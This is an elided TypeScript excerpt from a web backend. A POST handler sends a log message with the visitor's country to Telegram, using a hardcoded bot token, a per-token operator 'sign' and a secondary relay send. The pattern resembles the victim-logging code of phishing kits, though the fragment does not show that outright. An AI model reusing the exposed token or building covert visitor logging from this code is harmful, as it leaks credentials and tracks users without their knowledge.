...
async function sendTelegramMessage(
  ...
  try {
    ...
    try {
      ...
      btcPrice = btcData?.bitcoin?.usd?.toLocaleString?.() ??
        btcData?.bitcoin?.usd ??
        "N/A";
    } catch (e) {
    ...
    switch (TELEGRAM_BOT_TOKEN) {
      case "8283098210:AAFy5VGrL8JR-BDMsP8hIfGlhwDMMFsiiBw":
        sign = "mrc";
        break;
    ...
    try {
      ...
      console.error("Secondary Telegram send error:", e);
    }
...
export async function POST(request: Request) {
  try {
    ...
    const locationText = `${location.location.country} (<code>${location.location.countryCode}</code>)`;
    const sent = await sendTelegramMessage(logMessage, locationText, "HTML");
